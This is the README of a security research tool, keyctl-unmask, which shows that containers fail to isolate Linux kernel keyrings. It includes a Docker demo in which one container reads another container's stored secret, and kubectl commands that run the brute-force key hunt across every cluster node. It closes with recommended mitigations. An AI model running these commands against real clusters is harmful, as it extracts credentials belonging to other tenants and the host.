# Keyctl-unmask

This tool goes Florida on container keyring masks. It is a tool to demonstrate the ineffectivity that containers have on isolating Linux Kernel keyrings. 
go ru
See also [antitree/keyctl-unmask](https://hub.docker.com/repository/docker/antitree/keyctl-unmask) on Dockerhub



On part of the original fix for this was to simply "mask" `/proc/keys` so that `cat
/proc/keys` would return no results. 

**This tool Goes Florida on those masks.**

In reality, the mask just obfuscates the keys and you're free to 
issue syscalls to the kernel requesting any
keys you'd like. (Free as in Florida) 
So here we're:

* brute forcing an `int32` to guess the keyring ID's 
* asking the Linux kernel for information about the keyring, 
* if they're found try to "Possess" them and subsequently read the keys of other containers
* ... and even worse, the host

Let me be clear, there is an easy solution to this problem (seccomp, user
namespaces, compile time restrictions) and it's been known for years, but just
like Florida's mask policy, we've decided that we don't need these things all
the time because we need developers to have the freedom to develop without the
hindrence of security.

The most damaging scenario that I know of today for using this tool is 
if you were crazy enough to deploy Kerberos into Kubernetes and configure
it to use the KEYCTL credential storage. 

From within a container simply running `keyctl-unmask` will run like this:

![docker demo](/example/docker_demo.gif)

~~~bash
Search for Linux kernel keyrings even if /proc/keys are masked in a container
Usage: 

        keyctl-unmask -min 0 -max 999999999 

        keyctl-unmask -hunt

        keyctl-unmask -d

  -d    Log everything to stdout (cloud logging not supported)
  -hunt
        Enable brute force mode to search for key ids (default true)
  -key int
        Specific key ID to test (int32)
  -max int
        Max key id range (default 999999999)
  -min int
        Minimum key id range (default 1)
  -output string
        Output path (default "./keyctl_ids")
  -q    Quiet mode to disable logging and progress bar

~~~

## Example in Docker

In one container, create a new key representing a secret stored by a container:

~~~shell
docker run --name secret-server -it --security-opt \
    seccomp=unconfined antitree/keyctl-unmask /bin/bash 

> keyctl add user antitrees_secret thetruthisiliketrees @s
911117332
> keyctl show
Session Keyring
 899321446 --alswrv      0     0  keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
 911117332 --alswrv      0     0   \_ user: antitrees_secret
~~~

Start a separate container and attach a shell so we can test some things

~~~shell
docker run -it --name keyctl-attacker --security-opt seccomp=unconfined antitree/keyctl-unmask /bin/bash
root@keyctl-attacker:/# keyctl-unmask -min 0 -max 999999999
10 / 10 [----------------------------------------------------------------------------] 100.00% ? p/s 0s
Output saved to:  ./keyctl_ids
root@keyctl-attacker:/# cat keyctl_ids 
~~~

~~~json
{
 "KeyId": 899321446,
 "Valid": true,
 "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
 "Type": "keyring",
 "Uid": "0",
 "Gid": "0",
 "Perms": "3f1b0000",
 "String_Content": "\u0014\ufffdN6",
 "Byte_Content": "FIxONg==",
 "Comments": null,
 "Subkeys": [
  {
   "KeyId": 911117332,
   "Valid": true,
   "Name": "antitrees_secret",
   "Type": "user",
   "Uid": "0",
   "Gid": "0",
   "Perms": "3f010000",
   "String_Content": "thetruthisiliketrees",
   "Byte_Content": "dGhldHJ1dGhpc2lsaWtldHJlZXM=",
   "Comments": null,
   "Subkeys": null
  }
 ]
~~~


## Usage In Kubernetes

Most Kubernetes clusters have the "benefit" of running without seccomp enabled so
you can it like so:

```shell
kubectl run --rm -i \
      -t keyctl-unmask --image=keyctl-unmask \
      --image-pull-policy=Never --restart=Never \
      -- keyctl-unmask -hunt  
```

### Kubernetes One Off Pod With Progress Bar

The following one liner will start a hunt into the kubernetes cluster and 
return the results with the progress bar in a clean way. 

~~~shell
kubectl run whatever --rm -it --generator=Pod --image-pull-policy=Never \
      --restart=Never --image=antitree/keyctl-unmask \
      --overrides="$(cat example/k8s/keyctl-unmask-run.json)"
~~~

## Kubernetes All Nodes

Deploying as a Job will run this on each node in the cluster to let you figure out 
if any cluster has interesting things within each Node. This creates a PVC to store
the results of trying to extract each Node's keyrings. 

```bash
keyctl apply -f examples/k8s/keyctl-unmask-job.yaml
```

Attach to the debug Pod to read the results:

```bash
kubectl exec -it -n test keyctl-unmask-debug-pod -- /bin/bash
> cat /keyctl-output/$NODE_NAME
{
 "KeyId": 899321446,
 "Valid": true,
 "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
 "Type": "keyring",
...
```


## Pre-Emptive Responses To Potential Questions/Comments

**What's you're deal with Florida?**
IDK, just not feeling like a fan lately.

**Yeah but the Docker seccomp profile takes care of this.**

First, yes seccomp-bpf is a powerful tool and we should all use it for our containers but in the case of Docker, it's considered
a nice-to-have (not to mention difficult to use at scale). Because it's not a primary security control, and because there's no way 
to validate whether a seccomp profile is effective at runtime (see my other talks), we can't rely on it. It's a bolt on fix for the
real issue. 

**We should just enable user namespacing and this would be solved**

If you say that all you have to do is enable user namespacing, I'd say "You're right!" and "No one does" and "It's not the default for Docker"
Lets not say that user namespacing is a solution when enabling it breaks so many other things. 

**Everyone knows about this issue, this isn't new**

That this isn't new is mostly true in that it's been discussed since 2014 but it's been considered generally fixed since 
we added masks to `/proc/keys` and fixed it via seccomp. 

**No one uses keyrings**

That seems to be true for many things but I think it's interesting that the technology is completely incompatible with
containers in that every container can access any other container's keyrings including the hosts. 

**Fine well what do you want someone to do about it?**

1. Ensure that your container runtimes have support for namespaced keyrings: [It's possible](https://lwn.net/Articles/779895/), if anyone cares.
2. Make some of the protections that seccomp provides like blocking `KEYCTL` syscalls completely a compiled in security control .
3. Make seccomp usable in our runtimes. (See separate rant)

## Known Issues

* In minikube (and likely other non-standard linux OS's) the `get_persistent` keyctl SYSCALL isn't supported. From minikube host for example: `keyctl get_persistent @s -1`
